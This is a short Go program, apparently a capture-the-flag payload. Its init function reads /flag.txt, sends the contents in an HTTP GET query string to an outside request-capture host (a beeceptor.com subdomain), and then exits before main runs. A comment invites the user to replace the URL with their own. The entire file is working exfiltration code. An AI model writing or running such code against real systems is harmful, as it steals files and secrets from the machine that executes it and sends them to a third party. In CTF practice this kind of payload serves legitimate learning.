package main

import (
  "io/ioutil"
  "net/http"
  "os"
)

func init() {
  flag, err := ioutil.ReadFile("/flag.txt")
  if err != nil {
    return
  }
  // Exfiltrate the flag (replace with your own URL)
  http.Get("https://rashidy.free.beeceptor.com?flag=" + string(flag))
  os.Exit(0)  // Prevents normal execution continuing
}

func main() {}
